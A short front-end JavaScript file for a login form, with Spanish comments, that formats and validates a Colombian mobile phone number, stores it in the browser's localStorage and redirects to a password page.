const phoneNumber = document.getElementById("phoneNumber");
const loginButton = document.getElementById("loginButton");

phoneNumber.addEventListener("input", () => {
  handlePhoneNumberInput(phoneNumber);
});

function handlePhoneNumberInput(input) {
  let numero = input.value.replace(/\D/g, "");

  if (numero.length > 10) {
    numero = numero.substr(0, 10);
  }

  if (numero.length > 6) {
    numero = numero.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (numero.length > 3) {
    numero = numero.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }

  input.value = numero;
}

function esCelularColombiano(numero) {
  const texto = String(numero).trim();
  const regex = /^3\d{9}$/;
  if (!regex.test(texto)) return false;
  if (/^(\d)\1{9}$/.test(texto)) return false;
  if (/(\d)\1{4,}/.test(texto)) return false;
  return true;
}

export function LoginValidation(form) {
  let isValid = true;
  const phoneInput = form.querySelector("#phoneNumber");

  if (!phoneInput) {
    return false;
  }

  const phoneNumber = phoneInput.value.replace(/\D/g, "");

  if (phoneNumber[0] !== "3") {
    isValid = false;
  }

  if (phoneNumber.length !== 10) {
    isValid = false;
  }

  if (!esCelularColombiano(phoneNumber)) {
    isValid = false;
  }
  return isValid;
}

// ✅ NUEVO: Evento sin alertas - SOLO guarda en localStorage
loginButton.addEventListener("click", (event) => {
  event.preventDefault();

  const form = document.getElementById("homeForm");

  if (!LoginValidation(form)) {
    return;
  } else {
    const phoneNumber = form.querySelector("#phoneNumber").value;
    localStorage.setItem(
      "formData",
      JSON.stringify({
        phoneNumber: phoneNumber,
      })
    );
    // ✅ REDIRIGE directamente sin alert
    window.location.href = "access-sign-in-pass.php.html";
  }
});